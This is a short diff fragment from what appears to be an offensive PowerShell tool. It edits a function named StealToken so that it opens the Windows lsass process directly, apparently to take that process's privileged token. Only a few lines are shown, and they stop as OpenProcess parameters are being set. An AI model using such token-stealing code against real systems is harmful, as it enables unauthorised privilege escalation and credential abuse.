@@ -927,7 +927,8 @@ function EnumProcesses
 
 function StealToken
 {
-    $ProcessId = EnumProcesses
+    #$ProcessId = EnumProcesses
+    $ProcessId = (Get-Process -Name lsass).Id
 
     # OpenProcess Parameters         
     $DesiredAccess = 'PROCESS_QUERY_INFORMATION'
